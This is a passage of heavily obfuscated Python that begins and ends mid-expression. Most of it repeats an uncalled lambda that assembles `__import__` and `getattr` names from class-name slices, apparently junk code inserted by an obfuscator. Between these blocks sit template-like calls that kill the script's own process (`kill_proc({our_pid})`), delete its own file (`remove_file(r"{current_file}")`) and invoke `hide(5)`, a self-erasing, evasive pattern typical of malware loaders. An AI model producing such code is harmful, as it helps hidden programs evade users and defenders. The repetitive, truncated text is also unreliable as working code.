                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
        else:
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            (lambda _, __, ___, ____, _____, ______, _______, ________:
             getattr(
                 __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
                 ().__class__.__eq__.__class__.__name__[:__] +
                 ().__iter__().__class__.__name__[_____:________]
             ))
            break

def main():
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0001.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x001.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x00004.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0003.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x002.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x00005.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    if magic_p(
            0x000001 << 0x0000000000000000000000000000000000000000000000002 >> 0x00000000000000000000000000000000000000000000000000000000000000000000002,
            0x0000000000000000000000000004 << 0x0000000000000000000000000000002 >> 0x00000000000000000000000000000000000000000000000000004 << 0x000000000000000000000000000000000000000000000000000001) == magic_p(
            0x0000000000000000000000000000000000000000000000000000000000000004,
            0x00000000000000000000000000000000000000000000000000000005) and magic_p(
            0x0000000000000000000000000000000000000000000000000000998,
            0x0000000000000000000000000000000000000000000000000999) > 0x0000000000000000000000000000000000000000000000000000000000000:
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        magic(magic_p(10 - 10))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
        (lambda _, __, ___, ____, _____, ______, _______, ________:
         getattr(
             __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
             ().__class__.__eq__.__class__.__name__[:__] +
             ().__iter__().__class__.__name__[_____:________]
         ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
kill_proc({our_pid})
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
remove_file(r"{current_file}")
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
hide(5)
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
